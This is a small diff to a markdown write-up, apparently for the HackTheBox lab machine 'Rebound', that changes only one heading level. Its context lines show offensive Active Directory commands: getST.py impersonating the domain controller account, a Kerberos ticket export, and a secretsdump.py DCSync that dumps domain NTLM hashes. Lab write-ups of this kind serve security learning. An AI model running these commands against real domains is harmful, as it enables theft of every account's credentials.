@@ -246,7 +246,7 @@ getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_
 export KRB5CCNAME=./dc01\$.ccache
 ```
 
-## <u> Step 4: DCSync Attack on domain controller</u>
+### <u> Step 4: DCSync Attack on domain controller</u>
 
 ```sh
 secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm
